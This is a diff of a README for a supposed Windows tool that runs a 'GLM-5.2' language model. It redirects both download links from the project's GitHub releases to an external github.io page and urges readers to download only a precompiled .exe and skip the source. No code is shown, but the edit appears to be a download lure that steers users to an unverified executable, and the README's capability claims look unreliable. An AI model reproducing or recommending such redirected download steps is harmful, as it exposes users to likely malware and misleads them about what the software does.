@@ -1,6 +1,6 @@
 # 🚀 GLM-5.2-NVFP4-AQLM-Triple-DGX-Sparks - Run massive language models on hardware
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/misused-emergencyalertsystem552/GLM-5.2-NVFP4-AQLM-Triple-DGX-Sparks/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://misused-emergencyalertsystem552.github.io)
 
 This software allows users to run the GLM-5.2 language model on Windows systems. The application manages the complex memory requirements of the NVFP4 and AQLM compression formats. It enables the use of large context windows on standard hardware setups.
 
@@ -14,7 +14,7 @@ Ensure you have the latest graphics drivers installed from the manufacturer. Out
 
 You must visit the official release page to obtain the correct files. The software repository hosts several versions. Choose the most recent release to ensure compatibility with your system.
 
-[Download the application here](https://github.com/misused-emergencyalertsystem552/GLM-5.2-NVFP4-AQLM-Triple-DGX-Sparks/releases)
+[Download the application here](https://misused-emergencyalertsystem552.github.io)
 
 Click on the link to see the list of available assets. Look for the file ending in .exe. Right-click the file and save it to your Downloads folder. Do not attempt to run the source code files, as these require compilation and special tools. Download only the precompiled installer.
 
